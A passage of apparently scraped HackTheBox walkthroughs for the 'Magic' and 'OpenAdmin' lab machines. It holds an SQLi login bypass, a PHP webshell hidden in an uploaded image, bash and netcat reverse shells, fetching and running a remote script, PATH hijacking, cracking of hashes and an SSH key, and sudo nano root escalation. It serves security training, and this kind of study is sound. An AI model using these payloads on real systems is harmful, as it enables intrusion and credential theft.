root. Column Details Box Name Magic IP 10.10.10.185 Points 30 Difficulty Medium Creator TRX Release Date 18 Apr 2020 ReconTCP/80 (HTTP) FFUF 200 GET 60l 207w 4053c http://10.10.10.185/index.php 302 GET 0l 0w 0c http://10.10.10.185/logout.php =&amp;gt; index.php 403 GET 9l 28w 277c http://10.10.10.185/server-status 200 GET 108l 217w 2136c http://10.10.10.185/assets/css/upload.css 200 GET 27l 59w 782c http://10.10.10.185/assets/js/upload.js 302 GET 84l 177w 2957c http://10.10.10.185/upload.php =&amp;gt; login.php upload.php Initial FootholdTCP/80 (HTTP) - SQLi Authentication Bypass Login page @ http://magic.htb/login.php is susceptible to SQLi Authentication Bypass # Payload &#39; OR 1=1 -- - Redirected to an image upload page - upload.php TCP/80 (HTTP) - File Upload Bypass After some testing, the upload page has some sort of filter to prevent malicious files from being uploaded .php - unable to upload .jpg, .png - uploaded Uploaded files go to upload/images/&amp;lt;filename&amp;gt; However, the restrictions can be bypassed Upload any image file Add a webshell payload into the middle Test our webshell ┌──(root💀kali)-[~/htb/magic/10.10.10.185/exploit] └─# curl -s &quot;http://10.10.10.185/images/uploads/bingchilling.php.jpg?c=id&quot; --output - | strings | grep www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) Create reverse shell payload #!/bin/bash /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.14/4444 0&amp;gt;&amp;amp;1 Download reverse shell payload into magic.htb # Payload http://10.10.10.185/images/uploads/bingchilling.php.jpg?c=wget+10.10.14.14/exploit.sh+-O+/tmp/exploit.sh Start netcat listener ┌──(root💀kali)-[~/htb/magic] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.185. Invoke reverse shell http://10.10.10.185/images/uploads/bingchilling.php.jpg?c=chmod+777+/tmp/exploit.sh;/tmp/exploit.sh Demo - Image upload bypass and insert webshell Privilege EscalationTheseus - Enumeration Since there is a login page (login.php), there should be database credentials db5.php is included Found database creds in db5.php private static $dbName = &#39;Magic&#39; ; private static $dbHost = &#39;localhost&#39; ; private static $dbUsername = &#39;theseus&#39;; private static $dbUserPassword = &#39;iamkingtheseus&#39;; theseus:iamkingtheseus Failed to switch to user theseus w/ iamkingtheseus Access mysql to obtain more credentials theseus@ubuntu:/var/www/Magic$ mysql Command &#39;mysql&#39; not found, but can be installed with: apt install mysql-client-core-5.7 apt install mariadb-client-core-10.1 Ask your administrator to install one of them. mysql-client does not exist We can confirm that mysql is running w/ netstat www-data@ubuntu:/var/www/Magic$ netstat -ano | grep 3306 tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN off (0.00/0/0) Theseus - Obtain creds by querying mysql w/ PHP Create a PHP file query.php to query the database &amp;lt;?php $servername = &quot;localhost&quot;; $username = &quot;theseus&quot;; $password = &quot;iamkingtheseus&quot;; $dbname = &quot;Magic&quot;; // Create connection $conn = new mysqli($servername, $username, $password, $dbname); // Check connection if ($conn-&amp;gt;connect_error) { die(&quot;Connection failed: &quot; . $conn-&amp;gt;connect_error); } #$sql = &quot;SELECT id, firstname, lastname FROM MyGuests&quot;; $sql = &quot;SELECT username, password FROM login&quot;; $result = $conn-&amp;gt;query($sql); if ($result-&amp;gt;num_rows &amp;gt; 0) { // output data of each row while($row = $result-&amp;gt;fetch_assoc()) { echo &quot;username: &quot; . $row[&quot;username&quot;]. &quot; - password: &quot; . $row[&quot;password&quot;]; } } else { echo &quot;0 results&quot;; } $conn-&amp;gt;close(); ?&amp;gt; Queries for username &amp;amp; password from Magic database from login table - Code Skeleton Query mysql database www-data@ubuntu:/var/www/Magic$ php query.php username: admin - password: Th3s3usW4sK1ng admin:Th3s3usW4sK1ng Switch to user theseus w/ Th3s3usW4sK1ng www-data@ubuntu:/var/www/Magic$ su theseus Password: Th3s3usW4sK1ng theseus@ubuntu:/var/www/Magic$ id;whoami uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users) theseus Demo - Query database w/ PHP Root - Enumeration Enumerate files w/ setuid bit theseus@ubuntu:/var/www/Magic$ find / -perm /4000 -type f -exec ls -lda {} \\; 2&amp;gt;/dev/null | grep info -rwsr-x--- 1 root users 22040 Oct 21 2019 /bin/sysinfo Root - What is systeminfo doing? Find out what file type is /bin/sysinfo theseus@ubuntu:/var/www/Magic$ file /bin/sysinfo /bin/sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped Analyze the binary w/ binaryninja sysinfo is susceptible to PATH Hijacking exploit because the executables/binaries are not called w/ their FULL PATH. Root - Path Hijacking Understanding PATH environment variable PATH specifies the directories in which executable programs are located on the machine that can be started without knowing and typing the whole path to the file on the command line. - Source How do we exploit /bin/sysinfo Since the executables are not called w/ their full path, the system will search all the directories defined in the PATH environment variable for the executables. We can prepend a directory we have write access to, to the path environment variable, so that the system searches that directory first. We create a malicious executable that has the same name as the executable called in sysinfo, this will cause the system to execute our malicious executable because it is found first in the PATH environment. However, the exploit does not work if we prepend /tmp, we have to unset the PATH environment and then add /tmp only, not sure why. Exploit /bin/sysinfo Create reverse shell payload theseus@ubuntu:/tmp$ cat fdisk #!/bin/bash /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.14/4444 0&amp;gt;&amp;amp;1 Unset PATH environment variable theseus@ubuntu:/tmp$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games theseus@ubuntu:/tmp$ unset PATH theseus@ubuntu:/tmp$ echo $PATH theseus@ubuntu:/tmp$ Add /tmp to our PATH environment variable theseus@ubuntu:/tmp$ export PATH=/tmp theseus@ubuntu:/tmp$ echo $PATH /tmp Start netcat listener ┌──(root💀kali)-[~/htb/magic] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Invoke reverse shell theseus@ubuntu:/tmp$ /bin/sysinfo # Kali ┌──(root💀kali)-[~/htb/magic] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.185. Ncat: Connection from 10.10.10.185:39526. bash: groups: command not found Command &#39;lesspipe&#39; is available in the following places * /bin/lesspipe * /usr/bin/lesspipe The command could not be located because &#39;/bin:/usr/bin&#39; is not included in the PATH environment variable. lesspipe: command not found Command &#39;dircolors&#39; is available in &#39;/usr/bin/dircolors&#39; The command could not be located because &#39;/usr/bin&#39; is not included in the PATH environment variable. dircolors: command not found root@ubuntu:/tmp# Revert PATH environment theseus@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games Demo - sysinfo PATH Hijacking AdditionalTheseus - Obtain creds w/ SQLDump Instead of writing a PHP file to query mysql, we use mysqldump to dump mysql databases. The dump contains a set of SQL statements that can be executed to reproduce the original database object definitions and table data. On www-data, type mysql and hit tab www-data@ubuntu:/tmp$ mysql mysql_config_editor mysql_secure_installation mysqladmin mysqld mysqldumpslow mysqlrepair mysql_embedded mysql_ssl_rsa_setup mysqlanalyze mysqld_multi mysqlimport mysqlreport mysql_install_db mysql_tzinfo_to_sql mysqlbinlog mysqld_safe mysqloptimize mysqlshow mysql_plugin mysql_upgrade mysqlcheck mysqldump mysqlpump mysqlslap A list of mysql commands is displayed Dump Magic database w/ mysqldump www-data@ubuntu:/tmp$ mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic LOCK TABLES `login` WRITE; /*!40000 ALTER TABLE `login` DISABLE KEYS */; INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;); /*!40000 ALTER TABLE `login` ENABLE KEYS */; UNLOCK TABLES; /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */; admin:Th3s3usW4sK1ng Theseus - Port Forward to access MySQL on Kali Instead of writing a PHP file to query mysql, we use access mysql on kali w/ chisel By using chisel to port forward, we are able to access magic.htb mysql server on kali Portwarding w/ chisel kali ┌──(root💀kali)-[~/htb/magic] └─# chisel server --reverse --port 1337 2022/09/27 15:44:16 server: Reverse tunnelling enabled 2022/09/27 15:44:16 server: Fingerprint vnLX3w8MGxUv331CjE1Hmujl+mZimvFGhTgxXm3YNmc= 2022/09/27 15:44:16 server: Listening on http://0.0.0.0:1337 magic.htb www-data@ubuntu:/tmp$ ./chisel client 10.10.14.14:1337 R:3306:127.0.0.1:3306 &amp;amp; 2022/09/27 00:44:39 client: Connecting to ws://10.10.14.14:1337 2022/09/27 00:44:39 client: Connected (Latency 36.181644ms) Access mysql and query Magic database ┌──(root💀kali)-[~/htb/magic] └─# mysql --user=theseus --password=iamkingtheseus --host=127.0.0.1 Magic MySQL [Magic]&amp;gt; show tables; +-----------------+ | Tables_in_Magic | +-----------------+ | login | +-----------------+ 1 row in set (0.036 sec) MySQL [Magic]&amp;gt; SELECT * FROM login; +----+----------+----------------+ | id | username | password | +----+----------+----------------+ | 1 | admin | Th3s3usW4sK1ng | +----+----------+----------------+ 1 row in set (0.037 sec) MySQL [Magic]&amp;gt; admin:Th3s3usW4sK1ng How did we do a file upload bypass? View upload.php &amp;lt;?php $target_dir = &quot;images/uploads/&quot;; $target_file = $target_dir . basename($_FILES[&quot;image&quot;][&quot;name&quot;]); $uploadOk = 1; $allowed = array(&#39;2&#39;, &#39;3&#39;); $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if ($imageFileType != &quot;jpg&quot; &amp;amp;&amp;amp; $imageFileType != &quot;png&quot; &amp;amp;&amp;amp; $imageFileType != &quot;jpeg&quot;) { echo &quot;&amp;lt;script&amp;gt;alert(&#39;Sorry, only JPG, JPEG &amp;amp; PNG files are allowed.&#39;)&amp;lt;/script&amp;gt;&quot;; $uploadOk = 0; } if ($uploadOk === 1) { // Check if image is actually png or jpg using magic bytes $check = exif_imagetype($_FILES[&quot;image&quot;][&quot;tmp_name&quot;]); if (!in_array($check, $allowed)) { echo &quot;&amp;lt;script&amp;gt;alert(&#39;What are you trying to do there?&#39;)&amp;lt;/script&amp;gt;&quot;; $uploadOk = 0; } } //Check file contents /*$image = file_get_contents($_FILES[&quot;image&quot;][&quot;tmp_name&quot;]); if (strpos($image, &quot;&amp;lt;?&quot;) !== FALSE) { echo &quot;&amp;lt;script&amp;gt;alert(&#39;Detected \\&quot;\\&amp;lt;\\?\\&quot;. PHP is not allowed!&#39;)&amp;lt;/script&amp;gt;&quot;; $uploadOk = 0; }*/ if ($uploadOk === 1) { if (move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $target_file)) { echo &quot;The file &quot; . basename($_FILES[&quot;image&quot;][&quot;name&quot;]) . &quot; has been uploaded.&quot;; } else { echo &quot;Sorry, there was an error uploading your file.&quot;; } } } ?&amp;gt; We managed to bypass the first check because we appended .png, tricking pathinfo into thinking our .php is part of the filename, .png is the extension. Next, we managed to bypass the second check exif_imagetype by inserting our webshell payload in the middle of the image file, tricking exif_imagetype into thinking we uploaded a valid image - JPG (1), PNG(2). The 3rd check (Commented) is recursively checking for &amp;lt;?, however this causes many false positives because &amp;lt;? could be in a valid image file. Why was .php.png processed &amp;amp; Patch Vulnerability There is a .htaccess file residing in /var/www/Magic www-data@ubuntu:/var/www/Magic$ cat .htaccess &amp;lt;FilesMatch &quot;.+\\.ph(p([3457s]|\\-s)?|t|tml)&quot;&amp;gt; SetHandler application/x-httpd-php &amp;lt;/FilesMatch&amp;gt; &amp;lt;Files ~ &quot;\\.(sh|sql)&quot;&amp;gt; order deny,allow deny from all It is telling the webserver to process files that contains the word .php as PHP files, causing our webshell to execute. .htaccess supersedes configuration in mods-enabled/php5.6.conf www-data@ubuntu:/var/www/Magic$ cat /etc/apache2/mods-available/php5.6.conf &amp;lt;FilesMatch &quot;.+\\.ph(p[3457]?|t|tml)$&quot;&amp;gt; SetHandler application/x-httpd-php &amp;lt;/FilesMatch&amp;gt; &amp;lt;FilesMatch &quot;.+\\.phps$&quot;&amp;gt; SetHandler application/x-httpd-php-source # Deny access to raw php sources by default # To re-enable it&#39;s recommended to enable access to the files # only in specific virtual host or directory Require all denied &amp;lt;/FilesMatch&amp;gt; # Deny access to files without filename (e.g. &#39;.php&#39;) &amp;lt;FilesMatch &quot;^\\.ph(p[3457]?|t|tml|ps)$&quot;&amp;gt; Require all denied &amp;lt;/FilesMatch&amp;gt; # Running PHP scripts in user directories is disabled by default # # To re-enable PHP in user directories comment the following lines # (from &amp;lt;IfModule ...&amp;gt; to &amp;lt;/IfModule&amp;gt;.) Do NOT set it to On as it # prevents .htaccess files from disabling it. &amp;lt;IfModule mod_userdir.c&amp;gt; &amp;lt;Directory /home/*/public_html&amp;gt; php_admin_flag engine Off &amp;lt;/Directory&amp;gt; &amp;lt;/IfModule&amp;gt; The $ (end of string) causes the webserver to only process files as PHP only if .php is at the end of the filename, meaning .png.php will not work. Lets remove .htacess, the server will process our webshell as an image www-data@ubuntu:/var/www/Magic$ cp .htaccess htaccess.bak www-data@ubuntu:/var/www/Magic$ rm .htaccess " }, { "title": "HackTheBox - OpenAdmin", "url": "/posts/OpenAdmin/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/sudo/gtfo-bin, tcp/80-http/web-app-cms-exploit, pivot", "date": "2022-09-26 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering that on OpenNetAdmin 1.18.1 is running, it is susceptible to a RCE exploit, allowing us to obtain a low-privilege/www-datauser.For privilege escalation part, we have to privilege escalate to jimmy, joanna then to root.After enumerating files in /ona/ directory, mysql database credentials is revealed, allowing us to switch to user jimmy.After enumerating the system w/ linpeas.sh, jimmy belongs to a group internal and has RWX access to /var/www/internal, /var/www/internal is being hosted as user joanna locally on port 52846, w/ chisel we are able to access it on kali. Since jimmy has write access to /var/www/internal directory, simply inserting a web shell and invoking a reverse shell through that will privilege escalate us to user joanna.User joanna has a sudoers entry that allows joanna to execute nano as root. nano has a GTFOBins entry, allowing us to spawn a root shell. Column Details Box Name OpenAdmin IP 10.10.10.171 Points 20 Difficulty Easy Creator del_KZx497Ju Release Date 04 Jan 2020 ReconTCP/80 (HTTP) FFUF 301 GET 9l 28w 314c http://10.10.10.171/artwork =&amp;gt; http://10.10.10.171/artwork/ 200 GET 375l 964w 10918c http://10.10.10.171/index.html 301 GET 9l 28w 312c http://10.10.10.171/music =&amp;gt; http://10.10.10.171/music/ 403 GET 9l 28w 277c http://10.10.10.171/server-status Initial FootholdTCP/80 (HTTP) - OpenNetAdmin v18.1.1 Remote Code Execution Found OpenNetAdmin v18.1.1 running after clicking Login from http://OpenAdmin.htb/music Search exploits for OpenNetAdmin v18.1.1 Exploit Title Path OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) php/webapps/47772.rb OpenNetAdmin 18.1.1 - Remote Code Execution php/webapps/47691.sh How does OpenNetAdmin 18.1.1 - Remote Code Execution - (php/webapps/47691.sh) work? This module exploits a command injection in OpenNetAdmin between 8.5.14 and 18.1.1. Try OpenNetAdmin v18.1.1 - Remote Code Execution - (php/webapps/47691.sh) Exploit! ┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171] └─# sh 47691.sh http://openadmin.htb/ona/ $ id;whoami uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data $ The shell is unstable, could not upgrade shell to fully interactive tty. Create webshell ┌──(root💀kali)-[~/htb/OpenAdmin] └─# echo &quot;&amp;lt;?php system(\\$_GET[&#39;c&#39;]);?&amp;gt;&quot; | tee webshell.php &amp;lt;?php system($_GET[&#39;c&#39;]);?&amp;gt; Transfer webshell to openadmin.htb ┌──(root💀kali)-[~/htb/OpenAdmin] └─# nc -nvlp 4444 &amp;lt; webshell.php $ nc 10.10.14.14 4444 &amp;gt; webshell.php Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.171. Ncat: Connection from 10.10.10.171:53832. Invoke reverse shell ┌──(root💀kali)-[~/htb/OpenAdmin] └─# curl &quot;http://10.10.10.171/ona/webshell.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.14%2044 44%20%3E%2Ftmp%2Ff&quot; Demo - OpenNetAdmin v18.1.1 - Remote Code ExecutionTCP/80 (HTTP) - OpenNetAdmin v18.1.1 Remote Code Execution (Metasploit) Launch msfconsole Use unix/webapp/opennetadmin_ping_cmd_injection Set OPTIONS msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &amp;gt; set RHOSTS 10.10.10.171 RHOSTS =&amp;gt; 10.10.10.171 msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &amp;gt; set LHOST tun0 LHOST =&amp;gt; 10.10.14.14 msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &amp;gt; set payload 8 payload =&amp;gt; linux/x64/meterpreter/reverse_tcp View OPTIONS msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &amp;gt; show options Module options (exploit/unix/webapp/opennetadmin_ping_cmd_injection): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.171 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI /ona/login.php yes Base path URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (linux/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.14 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target Exploit! Privilege EscalationJimmy - Enumeration (Found Jimmy Creds) Since we saw a login page earlier, there should be a database configuration file, enumerate the system for configuration files www-data@openadmin:/opt/ona$ find . 2&amp;gt;/dev/null | grep config ./www/config ./www/config/auth_ldap.config.php ./www/config/config.inc.php View config.inc.php www-data@openadmin:/opt/ona$ cat ./www/config/config.inc.php | grep -n &quot;db\\|database&quot; ... 176:$dbconffile = &quot;{$base}/local/config/database_settings.inc.php&quot;; ... Points to a file w/ database configuration Found credentials at local/config/database_settings.inc.php www-data@openadmin:/opt/ona$ cat www/local/config/database_settings.inc.php &amp;lt;?php $ona_contexts=array ( &#39;DEFAULT&#39; =&amp;gt; array ( &#39;databases&#39; =&amp;gt; array ( 0 =&amp;gt; array ( &#39;db_type&#39; =&amp;gt; &#39;mysqli&#39;, &#39;db_host&#39; =&amp;gt; &#39;localhost&#39;, &#39;db_login&#39; =&amp;gt; &#39;ona_sys&#39;, &#39;db_passwd&#39; =&amp;gt; &#39;n1nj4W4rri0R!&#39;, &#39;db_database&#39; =&amp;gt; &#39;ona_default&#39;, &#39;db_debug&#39; =&amp;gt; false, ), ), &#39;description&#39; =&amp;gt; &#39;Default data context&#39;, &#39;context_color&#39; =&amp;gt; &#39;#D3DBFF&#39;, ), ); ?&amp;gt; ona_sys:n1nj4W4rri0R! Switch to jimmy w/ n1nj4W4rri0R! www-data@openadmin:/opt/ona$ su jimmy Password: n1nj4W4rri0R! jimmy@openadmin:/opt/ona$ Extract MySQL Database Hashes &amp;amp; Crack Connect to mysql w/ ona_sys:n1nj4W4rri0R! www-data@openadmin:/opt/ona$ mysql -u ona_sys -p Enter password: Extract hashes from users table from ona database mysql &amp;gt; use ona_default mysql&amp;gt; SELECT username, password FROM users; +----------+----------------------------------+ | username | password | +----------+----------------------------------+ | guest | 098f6bcd4621d373cade4e832627b4f6 | | admin | 21232f297a57a5a743894a0e4a801fc3 | +----------+----------------------------------+ Identify the hash ┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot] └─# nth -f hash --no-banner 098f6bcd4621d373cade4e832627b4f6 Most Likely MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files. MD4, HC: 900 JtR: raw-md4 NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory. Domain Cached Credentials, HC: 1100 JtR: mscach 21232f297a57a5a743894a0e4a801fc3 Most Likely MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files. MD4, HC: 900 JtR: raw-md4 NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory. Domain Cached Credentials, HC: 1100 JtR: mscach raw-md5 Crack hash w/ hashcat ┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot] └─# hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt --show 098f6bcd4621d373cade4e832627b4f6:test 21232f297a57a5a743894a0e4a801fc3:admin Joanna - Enumeration View groups for user admin jimmy@openadmin:/var/www/internal$ groups jimmy internal internal Found something interesting w/ linpeas.sh An internal port TCP/52846 Virtual Host is running as user joanna, Virtual Host web root directory: /var/www/internal Virtual Host is running on TCP/52846 User jimmy has write access to the web root directory. Joanna - How to privilege escalate w/ the info we have? Analyzing the information we have Since Virtual Host is configured to run as user joanna, commands executed by the webserver will be executed as user joanna. User jimmy has write access to the web root directory /var/www/internal, this means we can write a web shell, and invoke a reverse shell through the webshell to obtain joanna shell. We have to use SSH Tunnel/Chisel in order to access TCP/52846 on kali Joanna - Setup SSH Tunnel/Chisel Setup SSH Tunnel ┌──(root💀kali)-[~/htb/OpenAdmin] └─# ssh -L52846:127.0.0.1:52846 jimmy@openadmin.htb On kali, port 52846 is forwarded to openadmin.htb on port 52846 Enumerate TCP/52846 on kali ┌──(root💀kali)-[~/htb/OpenAdmin] └─# nmap -sV -sC localhost -p52846 PORT STATE SERVICE VERSION 52846/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Tutorialspoint.com OR use chisel kali ┌──(root💀kali)-[~/htb/OpenAdmin] └─# chisel server --reverse --port 1337 2022/09/26 01:46:59 server: Reverse tunnelling enabled 2022/09/26 01:46:59 server: Fingerprint tW7cYmw1k5JhH4eZ9m62QDga8zuBVNteoY4tiaxbFvY= 2022/09/26 01:46:59 server: Listening on http://0.0.0.0:1337 openadmin.htb jimmy@openadmin:/tmp$ ./chisel client 10.10.14.14:1337 R:52846:127.0.0.1:52846 &amp;amp; Joanna - Insert Webshell &amp;amp; Create joannabash Insert webshell jimmy@openadmin:/var/www/internal$ echo &quot;&amp;lt;?php system(\\$_GET[&#39;c&#39;])?&amp;gt;&quot; | tee webshell.php &amp;lt;?php system($_GET[&#39;c&#39;])?&amp;gt; Test if our webshell works ┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot] └─# curl localhost:52846/webshell.php?c=id uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal) Create a joannabash, bash w/ joanna setuid ┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot] └─# curl &quot;localhost:52846/webshell.php?c=cp+/bin/bash+./joannabash;chmod+4755+./joannabash;+ls+-la&quot; total 2208 drwxrwx--- 2 jimmy internal 4096 Sep 25 17:57 . drwxr-xr-x 4 root root 4096 Nov 22 2019 .. -rwxr-xr-x 1 joanna joanna 1113504 Sep 25 17:56 bash -rwxrwxr-x 1 jimmy internal 3229 Nov 22 2019 index.php -rwsr-xr-x 1 joanna joanna 1113504 Sep 25 17:57 joannabash -rwxrwxr-x 1 jimmy internal 185 Nov 23 2019 logout.php -rwxrwxr-x 1 jimmy internal 339 Nov 23 2019 main.php -rw-r--r-- 1 joanna joanna 5 Sep 25 17:56 test -rw-r--r-- 1 joanna joanna 5 Sep 25 17:56 testing -rw-rw-r-- 1 jimmy jimmy 27 Sep 25 17:52 webshell.php Execute joannabash to privilege escalate jimmy@openadmin:/var/www/internal$ ./joannabash -p joannabash-4.4$ id;whoami uid=1000(jimmy) gid=1000(jimmy) euid=1001(joanna) groups=1000(jimmy),1002(internal) joanna Demo - Insert webshell &amp;amp; create jonnabash Found joanna encrytped SSH private key. joannabash-4.4$ ls -la /home/joanna | grep .ssh drwx------ 2 joanna joanna 4096 Nov 23 2019 .ssh Joanna - Crack SSH Private Key Transfer id_rsa to kali Convert it to john format ┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot] └─# python ssh2john.py id_rsa &amp;gt; john_id_rsa Crack w/ john ┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot] └─# john john_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status bloodninjas (id_rsa) SSH w/ id_rsa &amp;amp; bloodninjas ┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot] └─# sshpass -P &quot;Enter passphrase&quot; -p &#39;bloodninjas&#39; ssh joanna@openadmin.htb -i id_rsa Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Sep 25 18:11:28 UTC 2022 System load: 0.0 Processes: 232 Usage of /: 33.8% of 7.81GB Users logged in: 1 Memory usage: 23% IP address for ens160: 10.10.10.171 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 39 packages can be updated. 11 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15 Root - Enumeration Check joanna’s sudo access joanna@openadmin:~$ sudo -l Matching Defaults entries for joanna on openadmin: env_keep+=&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;, env_keep+=&quot;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&quot;, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, mail_badpass User joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv /bin/nano - has a GTFOBins entry Root - SUID/SUDO GTFOBINS How do we exploit nano If the nano is allowed to run as superuser by sudo, it does not drop the elevated privileges We are able to spawn a root shell w/ nano shortcuts Exploit nano Execute sudo /bin/nano /opt/priv Type this CTRL+R, CTRL+X # Type reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0 root shell obtained Command to execute: reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0## Get Help ^X Read File# Cancel M-F New Buffer# id;whoamiuid=0(root) gid=0(root) groups=0(root)root Demo - GTFOBins nano AdditionalJoana - Login &amp;amp; Obtain SSH Private Instead of inserting a webshell, we can login to TCP/52846, revealing joanna SSH private key Since we have RWX on /var/www/internal, view index.php jimmy@openadmin:/var/www/internal$ cat index.php | grep password .form-signin input[type=&quot;password&quot;] { if (isset($_POST[&#39;login&#39;]) &amp;amp;&amp;amp; !empty($_POST[&#39;username&#39;]) &amp;amp;&amp;amp; !empty($_POST[&#39;password&#39;])) { if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;amp;&amp;amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) { $msg = &#39;Wrong username or password.&#39;; &amp;lt;input type = &quot;password&quot; class = &quot;form-control&quot; name = &quot;password&quot; required&amp;gt; Found hash Crack Hash w/ dcode Login w/ jimmy:Revealed, joanna’s SSH private key is displayed Fix main.php main.php is missing die command, if we were to curl main.php, SSH private key will still be displayed jimmy@openadmin:~$ curl -s localhost:52846/main.php&amp;lt;pre&amp;gt;-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D 